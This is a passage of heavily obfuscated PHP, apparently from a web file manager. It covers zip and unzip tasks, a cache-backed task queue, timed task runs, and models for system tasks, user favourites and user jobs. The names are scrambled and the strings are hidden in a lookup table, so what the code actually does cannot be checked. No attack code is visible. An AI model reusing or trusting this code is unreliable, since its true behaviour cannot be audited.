$«Æ‡Ù¢ = new TaskZip($¼’Åº­Ş, $úÄº•·´, 0, $ÄûÁÛîĞ ? $ÄûÁÛîĞ : $Ó¢·©Šš[0]); foreach ($Ó¢·©Šš as $£ŒÁâÊ) { $«Æ‡Ù¢->addPath($£ŒÁâÊ); } break; case $ŞÛ°’°·[1304]: if (!$º§ÇÏµÊ) { return echoLog($úÄº•·´ . $ŞÛ°’°·[1865]); } $«Æ‡Ù¢ = new TaskUnZip($¼’Åº­Ş, $úÄº•·´, 0, $ÄûÁÛîĞ ? $ÄûÁÛîĞ : $º§ÇÏµÊ); if ($º§ÇÏµÊ) { $«Æ‡Ù¢->addFile($º§ÇÏµÊ); } break; case $ŞÛ°’°·[162]: $«Æ‡Ù¢ = new TaskHttp($¼’Åº­Ş, $úÄº•·´); break; default: return; break; } $this->task = $«Æ‡Ù¢; $this->taskID = $¼’Åº­Ş; Hook::bind($ŞÛ°’°·[1799], array($this, $ŞÛ°’°·[1866])); Hook::bind($ŞÛ°’°·[1801], array($this, $ŞÛ°’°·[1867])); Hook::bind($ŞÛ°’°·[1795], array($this, $ŞÛ°’°·[1868])); echoLog($ŞÛ°’°·[1869] . $«Æ‡Ù¢->task[$ŞÛ°’°·[1666]]); } public function __destruct() { $this->end(); } public function end($ğßªëÓ = '') { $‰ú¼¸îó =& $_SERVER[¼èá¯æÙ]; if ($this->isEnd) { return; } if (!$this->task || !$this->taskID) { return; } $this->isEnd = !0; $this->task->end($ğßªëÓ); $this->task = !1; $this->taskID = !1; Hook::unbind($‰ú¼¸îó[1799], array($this, $‰ú¼¸îó[1866])); Hook::unbind($‰ú¼¸îó[1801], array($this, $‰ú¼¸îó[1867])); Hook::unbind($‰ú¼¸îó[1795], array($this, $‰ú¼¸îó[1868])); } public function taskUpdate($Ùƒ³üõ¢) { $é¦ôœëü =& $_SERVER[¼èá¯æÙ]; if (!$Ùƒ³üõ¢ || $this->taskID != $Ùƒ³üõ¢[$é¦ôœëü[486]]) { return; } $÷Õ¾ ºÆ = 20; $ûÍÜíŞÌ = intval($Ùƒ³üõ¢[$é¦ôœëü[1780]] * $÷Õ¾ ºÆ); $«ÊŠ•ãÙ = $é¦ôœëü[186] . str_repeat($é¦ôœëü[517], $ûÍÜíŞÌ) . $é¦ôœëü[1096] . str_repeat($é¦ôœëü[53], $÷Õ¾ ºÆ - $ûÍÜíŞÌ) . $é¦ôœëü[188]; $œ¢¯”ªÒ = $«ÊŠ•ãÙ . sprintf($é¦ôœëü[1870], $Ùƒ³üõ¢[$é¦ôœëü[1780]] * 100) . $é¦ôœëü[1871]; $Ñ¼£‡¡Ü = $œ¢¯”ªÒ . $Ùƒ³üõ¢[$é¦ôœëü[1779]] . $é¦ôœëü[8] . $Ùƒ³üõ¢[$é¦ôœëü[1145]] . LNG($é¦ôœëü[1872]); $çÅæ™…Ò = $é¦ôœëü[12]; if ($Ùƒ³üõ¢[$é¦ôœëü[1856]]) { $Ñ¼£‡¡Ü = $œ¢¯”ªÒ . size_format($Ùƒ³üõ¢[$é¦ôœëü[1779]]) . $é¦ôœëü[8] . size_format($Ùƒ³üõ¢[$é¦ôœëü[1145]]); $çÅæ™…Ò = size_format($Ùƒ³üõ¢[$é¦ôœëü[1781]]) . $é¦ôœëü[1873]; } if ($Ùƒ³üõ¢[$é¦ôœëü[1147]]) { $Ùƒ³üõ¢[$é¦ôœëü[1830]] = $Ùƒ³üõ¢[$é¦ôœëü[1147]] . $é¦ôœëü[53] . $Ùƒ³üõ¢[$é¦ôœëü[1830]]; } if ($Ùƒ³üõ¢[$é¦ôœëü[1830]]) { $ÕÀšéÚ = $é¦ôœëü[12]; if ($Ùƒ³üõ¢[$é¦ôœëü[1832]]) { $ÕÀšéÚ = $é¦ôœëü[50] . size_format($Ùƒ³üõ¢[$é¦ôœëü[1833]]) . $é¦ôœëü[8] . size_format($Ùƒ³üõ¢[$é¦ôœëü[1832]]); } $çÅæ™…Ò .= $Ùƒ³üõ¢[$é¦ôœëü[1830]] . $ÕÀšéÚ; } if ($Ùƒ³üõ¢[$é¦ôœëü[845]] && !$Ùƒ³üõ¢[$é¦ôœëü[1832]]) { $çÅæ™…Ò .= $é¦ôœëü[53] . size_format($Ùƒ³üõ¢[$é¦ôœëü[1837]]) . $é¦ôœëü[8] . size_format($Ùƒ³üõ¢[$é¦ôœëü[845]]); } echoLog($Ñ¼£‡¡Ü . $é¦ôœëü[53] . $çÅæ™…Ò, !0); } public function taskEnd($àÚ±„êÒ) { $‚ÎîÈ¨û =& $_SERVER[¼èá¯æÙ]; if (!$àÚ±„êÒ || $this->taskID != $àÚ±„êÒ[$‚ÎîÈ¨û[486]]) { return; } $ƒ²ö¿ş = $àÚ±„êÒ ? LNG($‚ÎîÈ¨û[1874]) . $‚ÎîÈ¨û[4] . $àÚ±„êÒ[$‚ÎîÈ¨û[1779]] . $‚ÎîÈ¨û[8] . $àÚ±„êÒ[$‚ÎîÈ¨û[1145]] . LNG($‚ÎîÈ¨û[1872]) . $‚ÎîÈ¨û[84] : $‚ÎîÈ¨û[12]; echoLog($‚ÎîÈ¨û[1875] . $àÚ±„êÒ[$‚ÎîÈ¨û[1666]] . ($àÚ±„êÒ[$‚ÎîÈ¨û[537]] ? $‚ÎîÈ¨û[84] . $àÚ±„êÒ[$‚ÎîÈ¨û[537]] : $‚ÎîÈ¨û[12]) . $‚ÎîÈ¨û[84] . $ƒ²ö¿ş . $‚ÎîÈ¨û[1876] . sprintf($‚ÎîÈ¨û[934], timeFloat() - $àÚ±„êÒ[$‚ÎîÈ¨û[1782]]) . $‚ÎîÈ¨û[1794]); $this->end(); } public function taskKill($Ûş»«¶‰) { $¢ÂÃºÒÑ =& $_SERVER[¼èá¯æÙ]; if (!$Ûş»«¶‰ || $this->taskID != $Ûş»«¶‰[$¢ÂÃºÒÑ[486]]) { return; } echoLog($¢ÂÃºÒÑ[1877] . $Ûş»«¶‰[$¢ÂÃºÒÑ[1666]]); } } class TaskQueue { const MAX_LENGTH = 2000; const QUEUE_LENGTH = "\164\141\x73\x6b\x51\165\145\165\145\x4c\x65\x6e\x67\164\x68"; const QUEUE_DATA = "\x74\x61\163\153\x51\165\145\x75\x65\x44\141\x74\141"; const QUEUE_TIME = "\x74\141\163\x6b\x51\165\x65\165\145\x4c\141\163\164\x52\x75\156"; const QUEUE_THREAD = "\164\141\x73\153\121\165\x65\x75\145\124\150\x72\145\141\x64"; public static $listData = false; public static $listDataAdd = false; public static function initTask() { } public static function add($ƒ¸Ó„®‰, $ˆÔÒ’˜ = array(), $ó—±¦ø‡ = '', $£Ò±‰´é = '') { $‚ÅÆÙ¿Ó =& $_SERVER[¼èá¯æÙ]; if (self::$listData === !1) { self::$listData = self::getAll(); self::$listDataAdd = array(); } if (count(self::$listData) >= self::MAX_LENGTH) { return !1; } if ($£Ò±‰´é && array_find_by_field(self::$listData, $‚ÅÆÙ¿Ó[107], $£Ò±‰´é)) { return !0; } if ($£Ò±‰´é && array_find_by_field(self::$listDataAdd, $‚ÅÆÙ¿Ó[107], $£Ò±‰´é)) { return !0; } self::$listDataAdd[] = array($‚ÅÆÙ¿Ó[353] => $ƒ¸Ó„®‰, $‚ÅÆÙ¿Ó[1878] => $ˆÔÒ’˜, $‚ÅÆÙ¿Ó[537] => $ó—±¦ø‡, $‚ÅÆÙ¿Ó[107] => $£Ò±‰´é); return !0; } public static function addSubmit() { $±çïæãß =& $_SERVER[¼èá¯æÙ]; if (!self::$listDataAdd || count(self::$listDataAdd) == 0) { return; } self::setAll(array_merge(self::getAll(), self::$listDataAdd)); write_log($±çïæãß[1879] . json_encode_force(array_to_keyvalue(self::$listDataAdd, $±çïæãß[12], $±çïæãß[537])), $±çïæãß[207]); self::$listData = !1; self::$listDataAdd = !1; } public static function addNow($ÖíğÙÈ, $¿Ùôîğê = array(), $’Çºé¤‹ = '', $ Àãñæ‘ = '') { $ô¡¡â£ =& $_SERVER[¼èá¯æÙ]; if (self::count() >= self::MAX_LENGTH) { return !1; } $¼Ö—òÆµ = self::getAll(); if ($ Àãñæ‘ && array_find_by_field($¼Ö—òÆµ, $ô¡¡â£[107], $ Àãñæ‘)) { return !0; } $¼Ö—òÆµ[] = array($ô¡¡â£[353] => $ÖíğÙÈ, $ô¡¡â£[1878] => $¿Ùôîğê, $ô¡¡â£[537] => $’Çºé¤‹, $ô¡¡â£[107] => $ Àãñæ‘); self::setAll($¼Ö—òÆµ); write_log($ô¡¡â£[1879] . $’Çºé¤‹, $ô¡¡â£[207]); return !0; } public static function run() { $ü“ş«…¡ =& $_SERVER[¼èá¯æÙ]; $¦¥îó = self::getAll(); $¤¨ùöñ½ = array_shift($¦¥îó); if (!$¤¨ùöñ½) { return !1; } self::setAll($¦¥îó); $¶Šƒ³¶Û = timeFloat(); $ÔÎòêÈƒ = $ü“ş«…¡[12]; try { $ÔÎòêÈƒ = Hook::apply($¤¨ùöñ½[$ü“ş«…¡[353]], $¤¨ùöñ½[$ü“ş«…¡[1878]]); } catch (Exception $’²ä¥) { write_log($’²ä¥, $ü“ş«…¡[1269]); } $İäéÜß = number_format(timeFloat() - $¶Šƒ³¶Û, 3) . $ü“ş«…¡[1794]; if ($ÔÎòêÈƒ && is_string($ÔÎòêÈƒ)) { $İäéÜß = $İäéÜß . $ü“ş«…¡[1880] . $ÔÎòêÈƒ; } write_log($ü“ş«…¡[1881] . $¤¨ùöñ½[$ü“ş«…¡[537]] . $ü“ş«…¡[1882] . $İäéÜß, $ü“ş«…¡[207]); Cache::set(self::QUEUE_TIME, time(), 3600 * 24 * 30); return !0; } public static function runThread() { $¡ôª€‹¡ =& $_SERVER[¼èá¯æÙ]; $æ‚šÀû = self::threadCount() + 1; if ($æ‚šÀû > 3 || !self::count()) { return; } write_log($¡ôª€‹¡[1883] . $æ‚šÀû, $¡ôª€‹¡[207]); Cache::set(self::QUEUE_THREAD, $æ‚šÀû, 3600 * 24); AutoTask::clearUserStatus(); while (!0) { if (!self::run()) { break; } usleep(mt_rand(200, 50000)); } Cache::set(self::QUEUE_THREAD, 0, 3600 * 24); write_log($¡ôª€‹¡[1884], $¡ôª€‹¡[207]); } public static function getKey($ÏÒÍ­çÑ, $ƒ³ˆ—û = "\x69\156\164") { $²¥ó”Ô± =& $_SERVER[¼èá¯æÙ]; Cache::removeMemory($ÏÒÍ­çÑ); $ª®ÂßÕè = Cache::get($ÏÒÍ­çÑ); if ($ƒ³ˆ—û == $²¥ó”Ô±[375]) { return $ª®ÂßÕè ? intval($ª®ÂßÕè) : 0; } if ($ƒ³ˆ—û == $²¥ó”Ô±[1885]) { return is_array($ª®ÂßÕè) ? $ª®ÂßÕè : array(); } return $ª®ÂßÕè; } public static function lastTime() { return self::getKey(self::QUEUE_TIME); } public static function count() { return self::getKey(self::QUEUE_LENGTH); } public static function threadCount() { return self::getKey(self::QUEUE_THREAD); } public static function getAll() { return self::getKey(self::QUEUE_DATA, $_SERVER[¼èá¯æÙ][1885]); } public static function setAll($ÚœàŠŠÇ) { $¤‰çõ = 3600 * 24 * 30; Cache::set(self::QUEUE_LENGTH, count($ÚœàŠŠÇ), $¤‰çõ); Cache::set(self::QUEUE_DATA, $ÚœàŠŠÇ, $¤‰çõ); Cache::removeMemory(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_DATA); } public static function clear() { self::setAll(array()); Cache::set(self::QUEUE_THREAD, 0, 60); } } class TaskRun { private static $asyncAdd = false; private static $syncTask = false; public static function timeLimit($¤Á„™“, $¤¬×˜ê = 5.0) { if (!$¤Á„™“) { return; } $Á£ûøúÏ = Cache::get($¤Á„™“); if (!$Á£ûøúÏ || timeFloat() - floatVal($Á£ûøúÏ) >= $¤¬×˜ê) { Cache::set($¤Á„™“, timeFloat(), $¤¬×˜ê * 10); return !0; } return !1; } public static function timeLimitCall($àÌŸù™, $“Ÿ´Æï°, $Üãı©€©, $Ú‡‘ë¼Û = 5.0) { $™µ²Æ® =& $_SERVER[¼èá¯æÙ]; if (!$àÌŸù™ || !$“Ÿ´Æï°) { return; } self::$asyncAdd = !0; $¹”ãÉÚÙ = $™µ²Æ®[1886]; $šçõ·‹ = Cache::get($¹”ãÉÚÙ, !0); $»™Ìø¸İ = array($™µ²Æ®[1887] => timeFloat(), $™µ²Æ®[1888] => timeFloat(), $™µ²Æ®[353] => $“Ÿ´Æï°, $™µ²Æ®[1878] => $Üãı©€©, $™µ²Æ®[216] => $Ú‡‘ë¼Û); if (is_array($šçõ·‹[$àÌŸù™])) { $»™Ìø¸İ[$™µ²Æ®[1888]] = $šçõ·‹[$àÌŸù™][$™µ²Æ®[1888]]; } if (is_array($šçõ·‹[$àÌŸù™])) { if (timeFloat() - $šçõ·‹[$àÌŸù™][$™µ²Æ®[1887]] < $»™Ìø¸İ[$™µ²Æ®[216]] * 0.3) { return; } $»™Ìø¸İ[$™µ²Æ®[1888]] = $šçõ·‹[$àÌŸù™][$™µ²Æ®[1888]]; } $šçõ·‹[$àÌŸù™] = $»™Ìø¸İ; Cache::set($¹”ãÉÚÙ, $šçõ·‹, 60); Cache::removeMemory($¹”ãÉÚÙ); write_log($™µ²Æ®[1889] . $àÌŸù™ . $™µ²Æ®[84] . $“Ÿ´Æï°, $™µ²Æ®[207]); } public static function timeLimitCallLoop() { $ŒàÏŞ›‘ =& $_SERVER[¼èá¯æÙ]; $ƒóš· = array($ŒàÏŞ›‘[1890]); $Ë®ÎâÃ† = in_array(strtolower(ACTION), $ƒóš·); if (!$Ë®ÎâÃ† && !self::$asyncAdd) { return; } $ƒı¿ş¯ = $ŒàÏŞ›‘[1886]; $±ÊÂ®ÀÄ = Cache::get($ƒı¿ş¯, !0); if (!$±ÊÂ®ÀÄ || count($±ÊÂ®ÀÄ) <= 0) { return; } $­ŸÕ¦¤³ = !1; $äêœ¶µù = timeFloat(); $Êˆ©åë† = array(); foreach ($±ÊÂ®ÀÄ as $»˜üáƒ‡ => $›Ûš¾Ğ) { if ($äêœ¶µù - $›Ûš¾Ğ[$ŒàÏŞ›‘[1888]] > $›Ûš¾Ğ[$ŒàÏŞ›‘[216]]) { $­ŸÕ¦¤³ = !0; try { Hook::apply($›Ûš¾Ğ[$ŒàÏŞ›‘[353]], $›Ûš¾Ğ[$ŒàÏŞ›‘[1878]]); write_log($ŒàÏŞ›‘[1891] . $»˜üáƒ‡ . $ŒàÏŞ›‘[84] . $›Ûš¾Ğ[$ŒàÏŞ›‘[353]] . $ŒàÏŞ›‘[1892] . ACTION, $ŒàÏŞ›‘[207]); } catch (Exception $¡–ëØÍ˜) { } continue; } $Êˆ©åë†[$»˜üáƒ‡] = $›Ûš¾Ğ; } if (!$­ŸÕ¦¤³) { return; } if (!$Êˆ©åë†) { return Cache::remove($ƒı¿ş¯); } Cache::set($ƒı¿ş¯, $Êˆ©åë†, 60); Cache::removeMemory($ƒı¿ş¯); } public static function finished($å›ûõì÷, $İ—“ŞË›) { $ıöúù =& $_SERVER[¼èá¯æÙ]; if (!self::$syncTask) { self::$syncTask = array(); } self::$syncTask[] = array($ıöúù[353] => $å›ûõì÷, $ıöúù[1878] => $İ—“ŞË›); } private static function finishedRun() { $òöˆ¨˜… =& $_SERVER[¼èá¯æÙ]; if (!self::$syncTask) { return; } foreach (self::$syncTask as $¸¤×°ò’) { try { Hook::apply($¸¤×°ò’[$òöˆ¨˜…[353]], $¸¤×°ò’[$òöˆ¨˜…[1878]]); } catch (Exception $ÆÊèòïç) { } } } public static function autoRun() { self::finishedRun(); self::timeLimitCallLoop(); } } goto fé¥¢íõ; eº›ªÀŞø¤: class SystemTaskModel extends ModelBaseLight { public $optionType = "\x53\x79\163\164\x65\155\x2e\x74\x61\163\153\114\151\163\x74"; public $field = array("\156\141\x6d\x65", "\x74\171\160\145", "\145\166\145\x6e\x74", "\x74\151\x6d\145", "\x64\x65\x73\143", "\x73\171\x73\x74\145\155", "\x65\156\x61\142\x6c\x65", "\x6c\x61\163\164\x52\x75\156", "\x73\x6f\162\x74"); public function listData($ÅåòÎô± = false, $‡îá²ä = "\x73\157\162\164", $¨¤ÖÀÅæ = false) { return parent::listData($ÅåòÎô±, $‡îá²ä, $¨¤ÖÀÅæ); } public function add($Ç¦´ÂÊ) { $¤½‰½ö’ =& $_SERVER[¼èá¯æÙ]; $Ùö‹úÅ‹ = $this->findByName($Ç¦´ÂÊ[$¤½‰½ö’[32]]); if ($Ùö‹úÅ‹) { return !1; } $Ç¦´ÂÊ[$¤½‰½ö’[1728]] = 0; $Ç¦´ÂÊ[$¤½‰½ö’[2003]] = $this->getSort(); return parent::insert($Ç¦´ÂÊ); } private function getSort() { $‰Ø•Êï÷ =& $_SERVER[¼èá¯æÙ]; $÷˜µò¾ = parent::listData(); $Ú§ƒ è‚ = array_to_keyvalue($÷˜µò¾, $‰Ø•Êï÷[12], $‰Ø•Êï÷[2003]); return empty($Ú§ƒ è‚) ? 0 : max($Ú§ƒ è‚) + 1; } public function update($†íÆı™Å, $€Ãíê–‰) { $ìÏàˆ¤§ =& $_SERVER[¼èá¯æÙ]; $¹éâô¹ = $this->listData($†íÆı™Å); $Î…ô‘ÀÏ = $this->findByName($€Ãíê–‰[$ìÏàˆ¤§[32]]); if (!$¹éâô¹ || $Î…ô‘ÀÏ && $Î…ô‘ÀÏ[$ìÏàˆ¤§[486]] != $¹éâô¹[$ìÏàˆ¤§[486]]) { return !1; } return parent::update($†íÆı™Å, $€Ãíê–‰); } public function remove($šú³Ñ¥Â, $¬ˆ¤Ç£Ÿ = false) { $—‰×¤¯¾ =& $_SERVER[¼èá¯æÙ]; $ÀîØ¾ˆ = $this->listData($šú³Ñ¥Â); if (!$ÀîØ¾ˆ) { return; } if (!$¬ˆ¤Ç£Ÿ && $ÀîØ¾ˆ[$—‰×¤¯¾[201]] == $—‰×¤¯¾[101]) { return !1; } return parent::remove($šú³Ñ¥Â); } public function enable($Ãıúø¿˜, $¥‘Ïİº) { return $this->update($Ãıúø¿˜, array($_SERVER[¼èá¯æÙ][2454] => $¥‘Ïİº)); } public function run($äµÇÎ²) { return $this->update($äµÇÎ², array($_SERVER[¼èá¯æÙ][2466] => time())); } } class UserFavModel extends ModelBase { protected $tableName = "\165\163\x65\x72\x5f\146\x61\166"; protected function cacheFunctionAlias($‰‰Úéİ¿) { $â€¥Âí‡ =& $_SERVER[¼èá¯æÙ]; return array($â€¥Âí‡[2094] => array(USER_ID, $â€¥Âí‡[2467])); } protected function listData() { $áä“ÅÓÄ =& $_SERVER[¼èá¯æÙ]; $ó¦«¨‹¡ = array($áä“ÅÓÄ[1769] => USER_ID, $áä“ÅÓÄ[568] => 0); $‘ÀäŒøô = $áä“ÅÓÄ[2468]; $ÃÚ°ÄĞ = $this->field($‘ÀäŒøô)->where($ó¦«¨‹¡)->order($áä“ÅÓÄ[2469])->select(); return $ÃÚ°ÄĞ ? $ÃÚ°ÄĞ : array(); } protected function resetCache() { } protected function listView() { $äæø†âñ =& $_SERVER[¼èá¯æÙ]; $™°šôÕ§ = $this->listData(); $àßİšÅĞ = array_filter_by_field($™°šôÕ§, $äæø†âñ[33], $äæø†âñ[501]); $ÖšıîåÆ = array_to_keyvalue($àßİšÅĞ, $äæø†âñ[12], $äæø†âñ[97]); if (!$ÖšıîåÆ) { return $™°šôÕ§; } $áıÈÎËù = 2000; $¶ç°„ÅÈ = array($äæø†âñ[502] => array($äæø†âñ[503], $ÖšıîåÆ)); $¼“íÇ = Model($äæø†âñ[907])->listSource($¶ç°„ÅÈ, $áıÈÎËù); $¼“íÇ = array_merge($¼“íÇ[$äæø†âñ[96]], $¼“íÇ[$äæø†âñ[95]]); $¼“íÇ = array_to_keyvalue($¼“íÇ, $äæø†âñ[203]); foreach ($™°šôÕ§ as $§ÓÅø Ğ => $á•¾Á’Ú) { $ñ¤§ïí† = $¼“íÇ[$á•¾Á’Ú[$äæø†âñ[97]]]; $ñ¤§ïí† = $ñ¤§ïí† ? $ñ¤§ïí† : array(); $™°šôÕ§[$§ÓÅø Ğ] = array_merge($ñ¤§ïí†, $á•¾Á’Ú); } return $™°šôÕ§; } protected function addFav($ÅĞŒ‡Ô¦, $—é¡ÖŠ = '', $«õÎÇÜÁ = "\x73\157\165\162\x63\x65") { $ÀĞóşŒ =& $_SERVER[¼èá¯æÙ]; $ˆ†©¼®è = array($ÀĞóşŒ[1769] => USER_ID, $ÀĞóşŒ[568] => 0, $ÀĞóşŒ[507] => $«õÎÇÜÁ, $ÀĞóşŒ[506] => $ÅĞŒ‡Ô¦); if ($this->where($ˆ†©¼®è)->find()) { return !1; } $ˆ†©¼®è = array($ÀĞóşŒ[1769] => USER_ID, $ÀĞóşŒ[568] => 0); $ÖŠÒ²ÈÃ = $this->where($ˆ†©¼®è)->max($ÀĞóşŒ[2003]); if (!$ÖŠÒ²ÈÃ) { $ÖŠÒ²ÈÃ = 0; } if (!$—é¡ÖŠ && $«õÎÇÜÁ == $ÀĞóşŒ[501]) { $æß…ôŸû = Model($ÀĞóşŒ[1426])->where(array($ÀĞóşŒ[502] => $ÅĞŒ‡Ô¦))->find(); if (!$æß…ôŸû) { return !1; } $—é¡ÖŠ = $æß…ôŸû[$ÀĞóşŒ[32]]; } $—é¡ÖŠ = $this->getAutoName($—é¡ÖŠ); $õ×É”ö = array($ÀĞóşŒ[1769] => USER_ID, $ÀĞóşŒ[568] => 0, $ÀĞóşŒ[505] => $—é¡ÖŠ, $ÀĞóşŒ[506] => $ÅĞŒ‡Ô¦, $ÀĞóşŒ[507] => $«õÎÇÜÁ, $ÀĞóşŒ[1983] => $ÖŠÒ²ÈÃ + 1); return $this->add($õ×É”ö); } protected function remove($³Ó®¥¿ƒ) { $ïÜõ’® =& $_SERVER[¼èá¯æÙ]; $„’ñë­È = array($ïÜõ’®[1769] => USER_ID, $ïÜõ’®[504] => $³Ó®¥¿ƒ); return $this->where($„’ñë­È)->delete(); } protected function removeByName($ü¿ëİ‡´) { $¢À°ıÃÜ =& $_SERVER[¼èá¯æÙ]; $•â´ô†ö = array($¢À°ıÃÜ[1769] => USER_ID, $¢À°ıÃÜ[505] => $ü¿ëİ‡´, $¢À°ıÃÜ[568] => 0); return $this->where($•â´ô†ö)->delete(); } protected function rename($¤…Š™Ú, $üüèÕ¿Æ) { $°Í„–Çé =& $_SERVER[¼èá¯æÙ]; if ($¤…Š™Ú == $üüèÕ¿Æ) { return !1; } $®€¿ÀÆõ = $this->getAutoName($üüèÕ¿Æ); if ($üüèÕ¿Æ != $®€¿ÀÆõ) { return !1; } $´ƒ³±Ö¥ = array($°Í„–Çé[1769] => USER_ID, $°Í„–Çé[568] => 0, $°Í„–Çé[32] => $¤…Š™Ú); return $this->where($´ƒ³±Ö¥)->save(array($°Í„–Çé[32] => $üüèÕ¿Æ)); } protected function resetSort($øó»œ¥¯) { $§µã¥´ =& $_SERVER[¼èá¯æÙ]; $øó»œ¥¯ = is_array($øó»œ¥¯) ? $øó»œ¥¯ : array(); $Åàâ‚  = array($§µã¥´[1769] => USER_ID); for ($Í‹ºÖŠÌ = 0; $Í‹ºÖŠÌ < count($øó»œ¥¯); $Í‹ºÖŠÌ++) { $Åàâ‚ [$§µã¥´[504]] = $øó»œ¥¯[$Í‹ºÖŠÌ]; $this->where($Åàâ‚ )->save(array($§µã¥´[1983] => $Í‹ºÖŠÌ + 1)); } return !0; } protected function moveTop($â­ìó…â) { $®‡ÛÍÆŒ =& $_SERVER[¼èá¯æÙ]; $úğ’î§˜ = array($®‡ÛÍÆŒ[1769] => USER_ID, $®‡ÛÍÆŒ[568] => 0); $ò¯’³ßé = $this->where($úğ’î§˜)->where(array($®‡ÛÍÆŒ[32] => $â­ìó…â))->find(); if (!$ò¯’³ßé) { return; } $Å”Ô¢Ğ¿ = $this->field($®‡ÛÍÆŒ[486])->where($úğ’î§˜)->order($®‡ÛÍÆŒ[2469])->select(); $Å”Ô¢Ğ¿ = array_to_keyvalue($Å”Ô¢Ğ¿, $®‡ÛÍÆŒ[12], $®‡ÛÍÆŒ[486]); $üšäÌ¬‘ = $Å”Ô¢Ğ¿; $Å”Ô¢Ğ¿ = array_remove_value($Å”Ô¢Ğ¿, $ò¯’³ßé[$®‡ÛÍÆŒ[486]]); array_unshift($Å”Ô¢Ğ¿, $ò¯’³ßé[$®‡ÛÍÆŒ[486]]); return $this->resetSort($Å”Ô¢Ğ¿); } protected function moveBottom($ëÈ¹êùÀ) { $ğî•¹â³ =& $_SERVER[¼èá¯æÙ]; $‹È‰Ë¢— = array($ğî•¹â³[1769] => USER_ID, $ğî•¹â³[568] => 0); $òÛ˜Ç¥Ç = $this->where($‹È‰Ë¢—)->max($ğî•¹â³[2003]); $ƒ…øíËš = array($ğî•¹â³[2003] => $òÛ˜Ç¥Ç + 1); return $this->where($‹È‰Ë¢—)->where(array($ğî•¹â³[32] => $ëÈ¹êùÀ))->save($ƒ…øíËš); } private function getAutoName($ÔÜ…Æôù) { $˜ö›Ú¸½ =& $_SERVER[¼èá¯æÙ]; $ŞÁÍ›ê = array($˜ö›Ú¸½[1769] => USER_ID, $˜ö›Ú¸½[568] => 0); $Ò»Ø‚›Ò = $this->field($˜ö›Ú¸½[32])->where($ŞÁÍ›ê)->select(); $Ò»Ø‚›Ò = array_to_keyvalue($Ò»Ø‚›Ò, $˜ö›Ú¸½[12], $˜ö›Ú¸½[32]); if (!$Ò»Ø‚›Ò || !in_array($ÔÜ…Æôù, $Ò»Ø‚›Ò)) { return $ÔÜ…Æôù; } for ($ÔÊĞ½Ğ = 0; $ÔÊĞ½Ğ < count($Ò»Ø‚›Ò); $ÔÊĞ½Ğ++) { if (!in_array($ÔÜ…Æôù . "\50{$ÔÊĞ½Ğ}\51", $Ò»Ø‚›Ò)) { return $ÔÜ…Æôù . "\x28{$ÔÊĞ½Ğ}\x29"; } } return $ÔÜ…Æôù . "\50{$ÔÊĞ½Ğ}\x29"; } } class UserJobModel extends ModelBaseLight { public $optionType = "\123\x79\163\x74\x65\155\56\x6a\x6f\142\114\151\163\164"; public $field = array("\156\141\155\x65", "\x64\x65\163\143", "\163\x6f\162\x74"); const JOB_KEY = "\163\x65\154\146\x4a\157\142\114\151\163\164"; public function listData($Ô”úÉß› = false, $àÊĞÄ¥Á = "\163\157\x72\164", $£í©Âáô = false) { return parent::listData($Ô”úÉß›, $àÊĞÄ¥Á, $£í©Âáô); } public function remove($Ã¶ûıà‚) { return parent::remove($Ã¶ûıà‚); } public function add($íÆ×ÒÏÓ) { $Ğâ½Î„í =& $_SERVER[¼èá¯æÙ]; if ($this->findByName($íÆ×ÒÏÓ[$Ğâ½Î„í[32]])) { return !1; } $íÆ×ÒÏÓ[$Ğâ½Î„í[2003]] = $this->getSort(); return parent::insert($íÆ×ÒÏÓ); } private function getSort() { $‚Œô§µÔ =& $_SERVER[¼èá¯æÙ]; $€äÃÉÖö = parent::listData(); $©ÖáæŞ¤ = array_to_keyvalue($€äÃÉÖö, $‚Œô§µÔ[12], $‚Œô§µÔ[2003]); return empty($©ÖáæŞ¤) ? 0 : max($©ÖáæŞ¤) + 1; } public function update($æá´ä­, $¥–”ÍÒ­) { $îòñõŒ¾ =& $_SERVER[¼èá¯æÙ]; $î¤ç‡Ìô = parent::listData($æá´ä­); $şĞ‘©Ò§ = $this->findByName($¥–”ÍÒ­[$îòñõŒ¾[32]]); if (!$î¤ç‡Ìô || $şĞ‘©Ò§ && $şĞ‘©Ò§[$îòñõŒ¾[486]] != $î¤ç‡Ìô[$îòñõŒ¾[486]]) { return !1; } return parent::update($æá´ä­, $¥–”ÍÒ­); } public function setUserJob($š¶’¶•½, $„Øù‘—©) { $±¾öœº¹ =& $_SERVER[¼èá¯æÙ]; if (!is_array($„Øù‘—©)) { $„Øù‘—© = array($„Øù‘—©); } $‡úªĞ‡“ = parent::listData(); $ñì¿Í´ = array_to_keyvalue($‡úªĞ‡“, $±¾öœº¹[32]); $‹Ü£Çóµ = $±¾öœº¹[63]; foreach ($„Øù‘—© as $«ğÊìÓµ) { if ($ñì¿Í´[$«ğÊìÓµ]) { $‹Ü£Çóµ .= $ñì¿Í´[$«ğÊìÓµ][$±¾öœº¹[486]] . $±¾öœº¹[50]; } else { $ÆÙ»¼ãØ = $this->add($«ğÊìÓµ); $‹Ü£Çóµ .= $ÆÙ»¼ãØ . $±¾öœº¹[50]; } } $‹Ü£Çóµ = rtrim($‹Ü£Çóµ, $±¾öœº¹[50]); Model($±¾öœº¹[608])->metaSet($š¶’¶•½, self::JOB_KEY, $‹Ü£Çóµ); } public function getUserJob($¬‡ÇÏÀ¨) { $ÚŒŞåÓÕ = Model($_SERVER[¼èá¯æÙ][608])->metaGet($¬‡ÇÏÀ¨); return $this->getUserJobInfo($ÚŒŞåÓÕ[self::JOB_KEY]); } public function getUserJobInfo($¸†Ó¢«–) { $ÑÂšñˆà =& $_SERVER[¼èá¯æÙ]; $ûıü“»î = explode($ÑÂšñˆà[50], $¸†Ó¢«–); $—¶Õ•®¯ = parent::listData(); $—¶Õ•®¯ = array_remove_key($—¶Õ•®¯, $ÑÂšñˆà[243]); $šÄ¢Ãçµ = array(); foreach ($ûıü“»î as $Ÿ’´õĞŠ) { if (isset($—¶Õ•®¯[$Ÿ’´õĞŠ])) { $šÄ¢Ãçµ[] = $—¶Õ•®¯[$Ÿ’´õĞŠ]; } } return $šÄ¢Ãçµ; } } goto D‚áÎÀÑ“è; C‹‘Î£·ºĞ: class CacheLock { protected static $handle; protected static $timeout; protected static $errorMsg = ''; protected static $lockItem = array(); public static function init() { $¾å¬éº =& $_SERVER[¼èá¯æÙ]; if (self::$handle) { return self::$handle; } $ÅÄÜĞÍ = $GLOBALS[$¾å¬éº[6]][$¾å¬éº[436]]; self::$timeout = $ÅÄÜĞÍ[$¾å¬éº[923]] ? 